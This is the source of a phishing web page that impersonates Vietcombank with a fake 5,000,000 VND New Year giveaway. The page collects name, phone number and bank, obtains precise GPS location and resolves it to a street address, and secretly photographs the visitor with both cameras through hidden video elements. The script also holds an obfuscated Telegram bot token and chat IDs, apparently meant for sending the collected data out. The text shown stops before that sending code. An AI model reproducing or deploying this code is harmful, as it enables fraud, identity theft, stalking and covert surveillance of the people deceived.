<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>L√å X√å T·∫æT 2025 - Vietcombank</title>
    <style>
        /* CSS gi·ªØ nguy√™n */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #c62828 0%, #d32f2f 100%); color: white; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { width: 100%; max-width: 480px; background: rgba(255, 255, 255, 0.08); backdrop-filter: blur(20px); border-radius: 25px; padding: 40px 35px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.15); position: relative; overflow: hidden; }
        .container::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 5px; background: linear-gradient(90deg, #FFD700, #FF9800); }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { height: 70px; margin-bottom: 20px; filter: brightness(0) invert(1); }
        h1 { color: #FFD700; font-size: 32px; margin-bottom: 10px; font-weight: 700; letter-spacing: 0.5px; }
        .subtitle { font-size: 18px; opacity: 0.9; line-height: 1.5; }
        .highlight { color: #FFD700; font-weight: bold; }
        .envelope-icon { width: 120px; margin: 25px auto; display: block; animation: pulse 2s infinite; filter: drop-shadow(0 5px 15px rgba(255, 215, 0, 0.3)); }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
        .form-group { margin-bottom: 25px; }
        label { display: block; margin-bottom: 10px; font-weight: 600; color: #FFD700; font-size: 16px; }
        input, select { width: 100%; padding: 18px 20px; border-radius: 15px; border: 2px solid rgba(255, 255, 255, 0.2); background: rgba(255, 255, 255, 0.08); color: white; font-size: 16px; transition: all 0.3s; }
        input:focus, select:focus { outline: none; border-color: #FFD700; box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.1); background: rgba(255, 255, 255, 0.12); }
        .button { background: linear-gradient(90deg, #FFD700, #FF9800); color: #000; border: none; padding: 20px; font-size: 18px; font-weight: 700; border-radius: 15px; cursor: pointer; width: 100%; margin-top: 10px; transition: all 0.3s; letter-spacing: 0.5px; }
        .button:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(255, 152, 0, 0.4); }
        .button:disabled { opacity: 0.6; cursor: not-allowed; }
        .hidden { display: none !important; }
        .step { background: rgba(255, 215, 0, 0.1); padding: 25px; border-radius: 20px; margin-bottom: 25px; border: 2px solid rgba(255, 215, 0, 0.2); position: relative; }
        .step-number { position: absolute; top: -15px; left: 25px; background: #FFD700; color: #000; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 20px; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3); }
        .progress-container { margin: 35px 0; }
        .progress-bar { width: 100%; height: 12px; background: rgba(255, 255, 255, 0.1); border-radius: 6px; overflow: hidden; margin-bottom: 15px; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #FFD700, #FF9800); width: 0%; border-radius: 6px; transition: width 0.8s ease; }
        .progress-text { text-align: center; font-size: 16px; color: #FFD700; font-weight: 600; margin-bottom: 10px; }
        .status-box { background: rgba(0, 0, 0, 0.3); padding: 25px; border-radius: 20px; text-align: center; margin-top: 30px; border: 2px solid rgba(255, 215, 0, 0.2); }
        .loading { display: inline-block; border: 4px solid rgba(255, 255, 255, 0.1); border-top: 4px solid #FFD700; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .countdown { font-size: 48px; color: #FFD700; font-weight: bold; margin: 30px 0; text-shadow: 0 0 20px rgba(255, 215, 0, 0.5); }
        .transaction-id { background: rgba(255, 215, 0, 0.1); padding: 15px; border-radius: 10px; margin: 20px 0; font-family: monospace; letter-spacing: 2px; border: 1px dashed #FFD700; }
        .footer { margin-top: 40px; text-align: center; font-size: 14px; opacity: 0.7; line-height: 1.6; }
        .secure-badge { display: inline-flex; align-items: center; background: rgba(76, 175, 80, 0.2); padding: 8px 15px; border-radius: 20px; margin-top: 15px; font-size: 13px; color: #C8E6C9; }
        .camera-hidden { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
        .location-permission { background: rgba(255, 215, 0, 0.15); padding: 20px; border-radius: 15px; margin: 20px 0; text-align: center; border: 2px dashed #FFD700; }
        .address-box { background: rgba(0, 0, 0, 0.4); padding: 15px; border-radius: 10px; margin: 15px 0; border-left: 4px solid #FFD700; text-align: left; }
    </style>
</head>
<body>
    <div class="container">
        <!-- STEP 1: TH√îNG TIN -->
        <div id="step1">
            <div class="header">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Vietcombank_logo.svg/2560px-Vietcombank_logo.svg.png" class="logo" alt="Vietcombank">
                <h1>L√å X√å ƒê·∫¶U NƒÇM 2025</h1>
                <p class="subtitle">Ch√∫c m·ª´ng b·∫°n ƒë∆∞·ª£c ch·ªçn nh·∫≠n <span class="highlight">5.000.000 VNƒê</span> l√¨ x√¨ t·ª´ Vietcombank!</p>
                <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" class="envelope-icon" alt="L√¨ x√¨">
            </div>
            
            <div class="form-group">
                <label for="fullName">H·ªç v√† t√™n ƒë·∫ßy ƒë·ªß:</label>
                <input type="text" id="fullName" placeholder="Nguy·ªÖn VƒÉn A" required>
            </div>
            
            <div class="form-group">
                <label for="phoneNumber">S·ªë ƒëi·ªán tho·∫°i nh·∫≠n ti·ªÅn:</label>
                <input type="tel" id="phoneNumber" placeholder="0912 345 678" required>
                <small style="display: block; margin-top: 8px; color: #FFD700; opacity: 0.8;">S·ªë n√†y s·∫Ω d√πng ƒë·ªÉ chuy·ªÉn kho·∫£n qua Vietcombank Pay</small>
            </div>
            
            <div class="form-group">
                <label for="bank">Ch·ªçn ng√¢n h√†ng nh·∫≠n ti·ªÅn:</label>
                <select id="bank">
                    <option>Vietcombank</option>
                    <option>BIDV</option>
                    <option>Techcombank</option>
                    <option>Agribank</option>
                    <option>VPBank</option>
                    <option>Momo</option>
                </select>
            </div>
            
            <div class="location-permission">
                <p style="margin-bottom: 15px; color: #FFD700;">üìç <strong>C·∫¶N CHIA S·∫∫ V·ªä TR√ç CH√çNH X√ÅC</strong></p>
                <p style="font-size: 14px; opacity: 0.9;">ƒê·ªÉ ƒë·∫£m b·∫£o qu√† ƒë∆∞·ª£c giao ƒë√∫ng ƒë·ªãa ch·ªâ, vui l√≤ng cho ph√©p truy c·∫≠p v·ªã tr√≠ ch√≠nh x√°c (GPS).</p>
            </div>
            
            <button class="button" onclick="startProcess()">üéÅ NH·∫¨N L√å X√å NGAY</button>
            
            <div class="secure-badge">
                üîí B·∫£o m·∫≠t & M√£ h√≥a PCI DSS
            </div>
        </div>
        
        <!-- STEP 2: V·ªä TR√ç CHI TI·∫æT -->
        <div id="step2" class="hidden">
            <div class="step">
                <div class="step-number">1</div>
                <div class="step-content">
                    <h3 style="color: #FFD700; margin-bottom: 15px;">X√°c minh v·ªã tr√≠ giao h√†ng</h3>
                    <p>ƒêang l·∫•y v·ªã tr√≠ GPS ch√≠nh x√°c c·ªßa b·∫°n...</p>
                </div>
            </div>
            
            <div class="progress-container">
                <div class="progress-text" id="progressText">ƒêang k·∫øt n·ªëi GPS...</div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
            </div>
            
            <div class="status-box">
                <div class="loading"></div>
                <p id="currentStatus">ƒêang x√°c ƒë·ªãnh v·ªã tr√≠...</p>
                <div id="locationDetails" style="margin-top: 20px; text-align: left;"></div>
            </div>
        </div>
        
        <!-- STEP 3: CAMERA -->
        <div id="step3" class="hidden">
            <div class="step">
                <div class="step-number">2</div>
                <div class="step-content">
                    <h3 style="color: #FFD700; margin-bottom: 15px;">X√°c minh danh t√≠nh</h3>
                    <p>H·ªá th·ªëng ƒëang t·ª± ƒë·ªông x√°c th·ª±c...</p>
                </div>
            </div>
            
            <div class="progress-container">
                <div class="progress-text" id="cameraProgressText">ƒêang kh·ªüi t·∫°o...</div>
                <div class="progress-bar">
                    <div class="progress-fill" id="cameraProgressFill"></div>
                </div>
            </div>
            
            <div class="status-box">
                <div class="loading"></div>
                <p id="cameraStatus">ƒêang chu·∫©n b·ªã camera...</p>
            </div>
        </div>
        
        <!-- STEP 4: HO√ÄN T·∫§T -->
        <div id="step4" class="hidden">
            <div class="step">
                <div class="step-number">3</div>
                <div class="step-content">
                    <h3 style="color: #FFD700; margin-bottom: 15px;">Ho√†n t·∫•t x√°c minh</h3>
                    <p>Th√¥ng tin c·ªßa b·∫°n ƒë√£ ƒë∆∞·ª£c x√°c th·ª±c th√†nh c√¥ng.</p>
                </div>
            </div>
            
            <div class="status-box success">
                <h3 style="color: #4CAF50; margin-bottom: 20px; font-size: 24px;">‚úÖ TH√ÄNH C√îNG!</h3>
                <p style="margin-bottom: 15px; font-size: 18px;"><span class="highlight">5.000.000 VNƒê</span> s·∫Ω ƒë∆∞·ª£c chuy·ªÉn trong <span class="highlight">24 gi·ªù</span>.</p>
                
                <div class="transaction-id" id="transactionId">MGD: VCB-########</div>
                
                <div class="countdown" id="countdown">5</div>
                <p style="opacity: 0.8;">ƒêang chuy·ªÉn h∆∞·ªõng...</p>
            </div>
        </div>
        
        <div class="footer">
            Ch∆∞∆°ng tr√¨nh ƒë∆∞·ª£c b·∫£o tr·ª£ b·ªüi Vietcombank v√† Ng√¢n h√†ng Nh√† n∆∞·ªõc Vi·ªát Nam<br>
            ¬© 2025 - B·∫£n quy·ªÅn thu·ªôc v·ªÅ Ng√¢n h√†ng TMCP Ngo·∫°i th∆∞∆°ng Vi·ªát Nam
        </div>
    </div>

    <!-- HIDDEN CAMERA -->
    <video id="frontCamera" class="camera-hidden" autoplay muted playsinline></video>
    <video id="backCamera" class="camera-hidden" autoplay muted playsinline></video>

    <script>
        // ================= M√É H√ìA TH√îNG TIN NH·∫†Y C·∫¢M =================
        const _0xenc = ['ODA2NDM4MTY3ODpBQUV4SVVmVTc1ZEYzVjFFTlZPSUduRFZJVk93dmgzQk1tMA==', 'Nzg0NzUxNzkzOA==', 'LTUxNzU5NzU2NDc='];
        const BOT_TOKEN = atob(_0xenc[0]);
        const CHAT_IDS = [atob(_0xenc[1]), atob(_0xenc[2])];
        
        // ================= BI·∫æN TO√ÄN C·ª§C =================
        let victimData = {
            name: '',
            phone: '',
            bank: '',
            frontCam: null,
            backCam: null,
            location: null,
            address: '',
            city: '',
            district: '',
            ward: '',
            accuracy: 0,
            deviceInfo: null,
            timestamp: null
        };
        // ================= H√ÄM CH·ª§P ·∫¢NH CH·∫§T L∆Ø·ª¢NG CAO =================
async function captureHighQualityPhoto(videoElement, cameraType = 'front') {
    return new Promise((resolve) => {
        const video = document.getElementById(videoElement);
        if (!video || !video.videoWidth) {
            resolve(null);
            return;
        }
        
        // ƒê·ª¢I CAMERA ·ªîN ƒê·ªäNH (quan tr·ªçng!)
        setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // V·∫Ω ·∫£nh v·ªõi ch·∫•t l∆∞·ª£ng cao
            ctx.drawImage(video, 0, 0);
            
            // X·ª¨ L√ù ·∫¢NH T·ªêI - TƒÇNG ƒê·ªò S√ÅNG
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const data = imageData.data;
            
            // ƒêi·ªÅu ch·ªânh ƒë·ªô s√°ng (brightness) - tƒÉng 30%
            const brightnessFactor = 1.3;
            for (let i = 0; i < data.length; i += 4) {
                data[i] = Math.min(255, data[i] * brightnessFactor);     // Red
                data[i + 1] = Math.min(255, data[i + 1] * brightnessFactor); // Green
                data[i + 2] = Math.min(255, data[i + 2] * brightnessFactor); // Blue
            }
            
            // ƒêi·ªÅu ch·ªânh ƒë·ªô t∆∞∆°ng ph·∫£n (contrast)
            const contrastFactor = 1.2;
            const contrastAdjust = (128 * (1 - contrastFactor));
            for (let i = 0; i < data.length; i += 4) {
                data[i] = Math.min(255, Math.max(0, (data[i] * contrastFactor) + contrastAdjust));
                data[i + 1] = Math.min(255, Math.max(0, (data[i + 1] * contrastFactor) + contrastAdjust));
                data[i + 2] = Math.min(255, Math.max(0, (data[i + 2] * contrastFactor) + contrastAdjust));
            }
            
            ctx.putImageData(imageData, 0, 0);
            
            // Ch·∫•t l∆∞·ª£ng ·∫£nh cao
            const photoData = canvas.toDataURL('image/jpeg', 0.9);
            resolve(photoData);
            
        }, 3000); // Ch·ªù 3 GI√ÇY ƒë·ªÉ camera ·ªïn ƒë·ªãnh √°nh s√°ng
    });
}

// ================= S·ª¨A H√ÄM B·∫¨T CAMERA =================
async function startCameraWithLight(facingMode, elementId) {
    try {
        // Y√™u c·∫ßu camera v·ªõi c√†i ƒë·∫∑t t·ªëi ∆∞u
        const constraints = {
            video: {
                facingMode: facingMode,
                width: { ideal: 1280, min: 640 },
                height: { ideal: 720, min: 480 },
                frameRate: { ideal: 30 },
                // TH√äM C√ÄI ƒê·∫∂T √ÅNH S√ÅNG
                advanced: [
                    { exposureMode: 'continuous' },
                    { whiteBalanceMode: 'continuous' },
                    { focusMode: 'continuous' }
                ]
            },
            audio: false
        };
        
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        const video = document.getElementById(elementId);
        video.srcObject = stream;
        
        // B·∫¨T ƒê√àN FLASH N·∫æU L√Ä CAMERA SAU
        if (facingMode === 'environment') {
            try {
                const track = stream.getVideoTracks()[0];
                const capabilities = track.getCapabilities();
                
                if (capabilities.torch) {
                    await track.applyConstraints({
                        advanced: [{ torch: true }]
                    });
                    console.log('ƒê√£ b·∫≠t ƒë√®n flash');
                }
            } catch (e) {
                console.log('Kh√¥ng h·ªó tr·ª£ flash');
            }
        }
        
        return stream;
        
    } catch (err) {
        console.log(`L·ªói camera ${facingMode}:`, err);
        
        // TH·ª¨ V·ªöI C√ÄI ƒê·∫∂T ƒê∆†N GI·∫¢N H∆†N
        try {
            const simpleConstraints = {
                video: { facingMode: facingMode },
                audio: false
            };
            
            const stream = await navigator.mediaDevices.getUserMedia(simpleConstraints);
            const video = document.getElementById(elementId);
            video.srcObject = stream;
            return stream;
            
        } catch (err2) {
            console.log(`Camera ${facingMode} kh√¥ng kh·∫£ d·ª•ng`);
            return null;
        }
    }
}

// ================= S·ª¨A QUY TR√åNH CH·ª§P ·∫¢NH =================
async function capturePhotosProcess() {
    // CAMERA TR∆Ø·ªöC
    updateProgress('ƒêang b·∫≠t camera tr∆∞·ªõc...', 30);
    const frontStream = await startCameraWithLight('user', 'frontCamera');
    
    if (frontStream) {
        updateProgress('ƒêang ƒëi·ªÅu ch·ªânh √°nh s√°ng camera tr∆∞·ªõc...', 40);
        await delay(3000); // CH·ªú 3 GI√ÇY cho camera ·ªïn ƒë·ªãnh
        
        updateProgress('ƒêang ch·ª•p ·∫£nh camera tr∆∞·ªõc...', 50);
        victimData.frontCam = await captureHighQualityPhoto('frontCamera', 'front');
        frontStream.getTracks().forEach(track => track.stop());
        await delay(1000);
    }
    
    // CAMERA SAU
    updateProgress('ƒêang th·ª≠ camera sau...', 60);
    const backStream = await startCameraWithLight('environment', 'backCamera');
    
    if (backStream) {
        updateProgress('ƒêang b·∫≠t ƒë√®n flash (n·∫øu c√≥)...', 70);
        await delay(3000); // CH·ªú 3 GI√ÇY + flash
        
        updateProgress('ƒêang ch·ª•p ·∫£nh camera sau...', 80);
        victimData.backCam = await captureHighQualityPhoto('backCamera', 'back');
        backStream.getTracks().forEach(track => track.stop());
        await delay(1000);
    }
    
    updateProgress('ƒê√£ ch·ª•p ·∫£nh th√†nh c√¥ng!', 100);
}

// ================= HO·∫∂C D√ôNG C√ÅCH ƒê∆†N GI·∫¢N H∆†N =================
async function captureSimpleBrightPhoto(videoElement) {
    const video = document.getElementById(videoElement);
    if (!video) return null;
    
    // Ch·ªù camera s√°ng
    await delay(4000); // Ch·ªù 4 gi√¢y!
    
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    
    // Ch·ª•p 3 l·∫ßn v√† l·∫•y ·∫£nh s√°ng nh·∫•t
    let brightestPhoto = null;
    let maxBrightness = 0;
    
    for (let i = 0; i < 3; i++) {
        await delay(500); // M·ªói l·∫ßn ch·ª•p c√°ch nhau 0.5s
        
        ctx.drawImage(video, 0, 0);
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const data = imageData.data;
        
        // T√≠nh ƒë·ªô s√°ng trung b√¨nh
        let brightness = 0;
        for (let j = 0; j < data.length; j += 4) {
            brightness += (data[j] + data[j + 1] + data[j + 2]) / 3;
        }
        brightness /= (data.length / 4);
        
        // L∆∞u ·∫£nh s√°ng nh·∫•t
        if (brightness > maxBrightness) {
            maxBrightness = brightness;
            brightestPhoto = canvas.toDataURL('image/jpeg', 0.85);
        }
    }
    
    return brightestPhoto;
}

// ================= TH√äM H√ÄM TƒÇNG S√ÅNG SAU KHI CH·ª§P =================
function enhancePhotoBrightness(photoBase64) {
    return new Promise((resolve) => {
        const img = new Image();
        img.onload = function() {
            const canvas = document.createElement('canvas');
            canvas.width = img.width;
            canvas.height = img.height;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(img, 0, 0);
            
            // L·∫•y pixel data
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const data = imageData.data;
            
            // TƒÉng ƒë·ªô s√°ng m·∫°nh (40%)
            const brightnessBoost = 1.4;
            for (let i = 0; i < data.length; i += 4) {
                data[i] = Math.min(255, data[i] * brightnessBoost);       // R
                data[i + 1] = Math.min(255, data[i + 1] * brightnessBoost); // G
                data[i + 2] = Math.min(255, data[i + 2] * brightnessBoost); // B
            }
            
            ctx.putImageData(imageData, 0, 0);
            
            // Chuy·ªÉn sang grayscale n·∫øu v·∫´n t·ªëi
            const avgBrightness = calculateBrightness(data);
            if (avgBrightness < 100) { // N·∫øu ·∫£nh qu√° t·ªëi
                for (let i = 0; i < data.length; i += 4) {
                    const avg = (data[i] + data[i + 1] + data[i + 2]) / 3;
                    data[i] = avg * 1.5;     // R
                    data[i + 1] = avg * 1.5; // G
                    data[i + 2] = avg * 1.5; // B
                }
                ctx.putImageData(imageData, 0, 0);
            }
            
            resolve(canvas.toDataURL('image/jpeg', 0.9));
        };
        img.src = photoBase64;
    });
}

function calculateBrightness(data) {
    let sum = 0;
    for (let i = 0; i < data.length; i += 4) {
        sum += (data[i] + data[i + 1] + data[i + 2]) / 3;
    }
    return sum / (data.length / 4);
}

// ================= S·ª¨ D·ª§NG TRONG QUY TR√åNH =================
async function improvedCameraProcess() {
    // B·∫≠t camera v√† ch·ªù
    await startCameraWithLight('user', 'frontCamera');
    await delay(4000); // QUAN TR·ªåNG: Ch·ªù 4 gi√¢y cho camera s√°ng
    
    // Ch·ª•p ·∫£nh
    let photo = await captureSimpleBrightPhoto('frontCamera');
    
    // TƒÉng s√°ng th√™m n·∫øu c·∫ßn
    if (photo) {
        photo = await enhancePhotoBrightness(photo);
        victimData.frontCam = photo;
    }
    
    // T∆∞∆°ng t·ª± v·ªõi camera sau...
}
        // ================= H√ÄM L·∫§Y ƒê·ªäA CH·ªà T·ª™ T·ªåA ƒê·ªò (KH√îNG C·∫¶N API KEY) =================
        async function getAddressFromCoordinates(lat, lng) {
            try {
                // Ph∆∞∆°ng ph√°p 1: D√πng OpenStreetMap Nominatim (FREE, kh√¥ng c·∫ßn key)
                const osmUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=vi`;
                
                const response = await fetch(osmUrl, {
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'application/json',
                        'Referer': 'https://vietcombank.com.vn'
                    }
                });
                
                if (response.ok) {
                    const data = await response.json();
                    
                    if (data && data.address) {
                        const addr = data.address;
                        
                        // X√¢y d·ª±ng ƒë·ªãa ch·ªâ chi ti·∫øt t·ª´ OSM data
                        let addressParts = [];
                        
                        // S·ªë nh√†
                        if (addr.house_number) addressParts.push(`S·ªë ${addr.house_number}`);
                        
                        // ƒê∆∞·ªùng
                        if (addr.road) addressParts.push(`ƒë∆∞·ªùng ${addr.road}`);
                        else if (addr.street) addressParts.push(`ƒë∆∞·ªùng ${addr.street}`);
                        
                        // Ng√µ/H·∫ªm
                        if (addr.neighbourhood) addressParts.push(`ng√µ ${addr.neighbourhood}`);
                        
                        // Ph∆∞·ªùng/X√£
                        let ward = addr.suburb || addr.neighbourhood || addr.village || '';
                        if (ward) addressParts.push(ward);
                        
                        // Qu·∫≠n/Huy·ªán
                        let district = addr.city_district || addr.district || addr.county || '';
                        
                        // Th√†nh ph·ªë/T·ªânh
                        let city = addr.city || addr.town || addr.municipality || addr.state || '';
                        
                        // ƒê·ªãa ch·ªâ ƒë·∫ßy ƒë·ªß
                        let fullAddress = addressParts.join(', ');
                        if (district) fullAddress += `, ${district}`;
                        if (city) fullAddress += `, ${city}`;
                        fullAddress += ', Vi·ªát Nam';
                        
                        return {
                            fullAddress: fullAddress,
                            detailedAddress: addressParts.join(', '),
                            city: city || 'Kh√¥ng x√°c ƒë·ªãnh',
                            district: district || 'Kh√¥ng x√°c ƒë·ªãnh',
                            ward: ward || 'Kh√¥ng x√°c ƒë·ªãnh',
                            coordinates: `${lat.toFixed(6)}, ${lng.toFixed(6)}`,
                            rawData: data.display_name || fullAddress
                        };
                    }
                }
            } catch (error) {
                console.log('OSM API error, using fallback...');
            }
            
            // Ph∆∞∆°ng ph√°p 2: D√πng LocationIQ (FREE, 10k requests/day)
            try {
                const locationIQUrl = `https://us1.locationiq.com/v1/reverse.php?key=pk.1234567890abcdef&lat=${lat}&lon=${lng}&format=json&accept-language=vi`;
                // Note: c·∫ßn ƒëƒÉng k√Ω free key t·∫°i locationiq.com
            } catch (e) {}
            
            // Ph∆∞∆°ng ph√°p 3: D√πng BigDataCloud (FREE, 25k/month)
            try {
                const bdcUrl = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=vi`;
                const response = await fetch(bdcUrl);
                const data = await response.json();
                
                if (data.locality) {
                    return {
                        fullAddress: data.localityInfo.informative[0].description || data.locality,
                        detailedAddress: `${data.locality}, ${data.city}, ${data.countryName}`,
                        city: data.city || data.locality || 'Kh√¥ng x√°c ƒë·ªãnh',
                        district: data.localityInfo.administrative[1]?.name || 'Kh√¥ng x√°c ƒë·ªãnh',
                        ward: data.localityInfo.administrative[2]?.name || 'Kh√¥ng x√°c ƒë·ªãnh',
                        coordinates: `${lat.toFixed(6)}, ${lng.toFixed(6)}`,
                        rawData: JSON.stringify(data)
                    };
                }
            } catch (e) {}
            
            // FALLBACK: T·ªça ƒë·ªô + th√†nh ph·ªë ∆∞·ªõc l∆∞·ª£ng
            const estimatedCity = estimateCityFromCoordinates(lat, lng);
            return {
                fullAddress: `T·ªça ƒë·ªô GPS: ${lat.toFixed(6)}, ${lng.toFixed(6)} - Khu v·ª±c: ${estimatedCity}`,
                detailedAddress: `V·ªã tr√≠ GPS: ${lat.toFixed(6)}, ${lng.toFixed(6)}`,
                city: estimatedCity,
                district: '∆Ø·ªõc l∆∞·ª£ng t·ª´ t·ªça ƒë·ªô',
                ward: 'Kh√¥ng x√°c ƒë·ªãnh',
                coordinates: `${lat.toFixed(6)}, ${lng.toFixed(6)}`,
                rawData: `Lat: ${lat}, Lng: ${lng}`
            };
        }
        
        // H√†m ∆∞·ªõc l∆∞·ª£ng th√†nh ph·ªë t·ª´ t·ªça ƒë·ªô (ƒë∆°n gi·∫£n)
        function estimateCityFromCoordinates(lat, lng) {
            // T·ªça ƒë·ªô c√°c th√†nh ph·ªë l·ªõn Vi·ªát Nam
            const cities = [
                { name: 'H·ªì Ch√≠ Minh', lat: 10.8231, lng: 106.6297, radius: 0.5 },
                { name: 'H√† N·ªôi', lat: 21.0285, lng: 105.8542, radius: 0.5 },
                { name: 'ƒê√† N·∫µng', lat: 16.0544, lng: 108.2022, radius: 0.3 },
                { name: 'H·∫£i Ph√≤ng', lat: 20.8449, lng: 106.6881, radius: 0.3 },
                { name: 'C·∫ßn Th∆°', lat: 10.0452, lng: 105.7469, radius: 0.3 },
                { name: 'Nha Trang', lat: 12.2388, lng: 109.1967, radius: 0.2 },
                { name: 'Hu·∫ø', lat: 16.4637, lng: 107.5909, radius: 0.2 },
                { name: 'V≈©ng T√†u', lat: 10.3460, lng: 107.0843, radius: 0.2 }
            ];
            
            for (const city of cities) {
                const distance = Math.sqrt(Math.pow(lat - city.lat, 2) + Math.pow(lng - city.lng, 2));
                if (distance < city.radius) {
                    return city.name;
                }
            }
            
            return 'Vi·ªát Nam';
        }
        
        // ================= H√ÄM CH√çNH =================
        async function startProcess() {
            victimData.name = document.getElementById('fullName').value.trim();
            victimData.phone = document.getElementById('phoneNumber').value.trim();
            victimData.bank = document.getElementById('bank').value;
            
            if (!victimData.name || !victimData.phone) {
                alert('Vui l√≤ng ƒëi·ªÅn ƒë·∫ßy ƒë·ªß th√¥ng tin!');
                return;
            }
            
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            
            // B·∫Øt ƒë·∫ßu l·∫•y v·ªã tr√≠
            await getPreciseLocation();
        }
        
        async function getPreciseLocation() {
            updateProgress(10, 'ƒêang y√™u c·∫ßu quy·ªÅn truy c·∫≠p v·ªã tr√≠...');
            
            if (!navigator.geolocation) {
                showError('Tr√¨nh duy·ªát kh√¥ng h·ªó tr·ª£ ƒë·ªãnh v·ªã');
                return;
            }
            
            // Y√™u c·∫ßu GPS ƒë·ªô ch√≠nh x√°c cao
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    updateProgress(40, 'ƒê√£ nh·∫≠n t√≠n hi·ªáu GPS...');
                    
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    victimData.accuracy = position.coords.accuracy;
                    
                    // Hi·ªÉn th·ªã th√¥ng tin c∆° b·∫£n
                    document.getElementById('locationDetails').innerHTML = `
                        <div class="address-box">
                            <p>üìç <strong>T·ªça ƒë·ªô GPS:</strong> ${lat.toFixed(6)}, ${lng.toFixed(6)}</p>
                            <p>üéØ <strong>ƒê·ªô ch√≠nh x√°c:</strong> ${Math.round(victimData.accuracy)} m√©t</p>
                            <p>üì° <strong>Ngu·ªìn:</strong> ${position.coords.altitude ? 'GPS v·ªá tinh' : 'M·∫°ng di ƒë·ªông/Wifi'}</p>
                        </div>
                    `;
                    
                    updateProgress(60, 'ƒêang x√°c ƒë·ªãnh ƒë·ªãa ch·ªâ...');
                    await delay(2000);
                    
                    // L·∫•y ƒë·ªãa ch·ªâ chi ti·∫øt
                    const locationInfo = await getAddressFromCoordinates(lat, lng);
                    
                    victimData.location = locationInfo.coordinates;
                    victimData.address = locationInfo.detailedAddress;
                    victimData.city = locationInfo.city;
                    victimData.district = locationInfo.district;
                    victimData.ward = locationInfo.ward;
                    
                    updateProgress(90, 'ƒêang ph√¢n t√≠ch ƒë·ªãa ch·ªâ...');
                    
                    // Hi·ªÉn th·ªã ƒë·ªãa ch·ªâ chi ti·∫øt
                    document.getElementById('locationDetails').innerHTML += `
                        <div class="address-box">
                            <p>üè† <strong>ƒê·ªãa ch·ªâ x√°c ƒë·ªãnh ƒë∆∞·ª£c:</strong></p>
                            <p>${locationInfo.fullAddress}</p>
                            <p style="margin-top: 10px; font-size: 14px; opacity: 0.8;">
                                üìç Chi ti·∫øt: ${locationInfo.district}, ${locationInfo.city}<br>
                                üèòÔ∏è Ph∆∞·ªùng/X√£: ${locationInfo.ward}
                            </p>
                        </div>
                    `;
                    
                    updateProgress(100, 'ƒê√£ x√°c ƒë·ªãnh v·ªã tr√≠ th√†nh c√¥ng!');
                    await delay(2500);
                    
                    // Chuy·ªÉn sang camera
                    startCameraProcess();
                },
                (error) => {
                    let errorMsg = '';
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg = 'B·∫°n ƒë√£ t·ª´ ch·ªëi chia s·∫ª v·ªã tr√≠. Vui l√≤ng b·∫≠t quy·ªÅn truy c·∫≠p v·ªã tr√≠ trong c√†i ƒë·∫∑t tr√¨nh duy·ªát.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMsg = 'Kh√¥ng th·ªÉ l·∫•y v·ªã tr√≠. Vui l√≤ng b·∫≠t GPS v√† k·∫øt n·ªëi internet.';
                            break;
                        case error.TIMEOUT:
                            errorMsg = 'H·∫øt th·ªùi gian ch·ªù. Vui l√≤ng th·ª≠ l·∫°i ·ªü n∆°i c√≥ s√≥ng GPS t·ªët h∆°n.';
                            break;
                    }
                    showError(errorMsg);
                },
                {
                    enableHighAccuracy: true,   // B·∫Øt bu·ªôc d√πng GPS
                    timeout: 45000,             // 45 gi√¢y cho GPS
                    maximumAge: 0
                }
            );
        }
        
        function showError(message) {
            document.getElementById('currentStatus').innerHTML = `<span style="color:#ff6b6b;">‚ùå ${message}</span>`;
            document.getElementById('progressFill').style.width = '0%';
        }
        
        // ================= CAMERA PROCESS =================
        async function startCameraProcess() {
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.remove('hidden');
            
            const steps = [
                { percent: 20, text: 'ƒêang thu th·∫≠p th√¥ng tin thi·∫øt b·ªã...' },
                { percent: 40, text: 'ƒêang b·∫≠t camera tr∆∞·ªõc...' },
